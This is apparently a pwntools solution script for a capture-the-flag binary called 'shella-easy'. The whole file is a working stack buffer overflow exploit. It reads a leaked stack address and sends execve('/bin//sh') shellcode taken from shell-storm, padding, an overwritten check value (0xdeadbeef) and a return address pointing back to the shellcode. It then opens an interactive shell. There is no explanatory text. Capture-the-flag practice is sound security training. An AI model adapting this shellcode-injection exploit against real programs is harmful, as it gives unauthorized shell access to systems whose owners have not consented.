from pwn import *

context.terminal = [ "wt.exe", "-w", "0", "sp", "--", "wsl.exe", "--" ]
target = process("./shella-easy")
# target = gdb.debug("./shella-easy", "b *main + 99")
target.recvuntil(b"have a ")
str = int(target.recvuntil(b" ").strip(), 16)
print(hex(str))
target.recvuntil(b"thanks")
# https://shell-storm.org/shellcode/files/shellcode-841.html
payload = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload += (0x40 - len(payload)) * b"A"
payload += p32(0xdeadbeef)
payload += 8 * b"A"
payload += p32(str)
target.sendline(payload)
target.interactive()
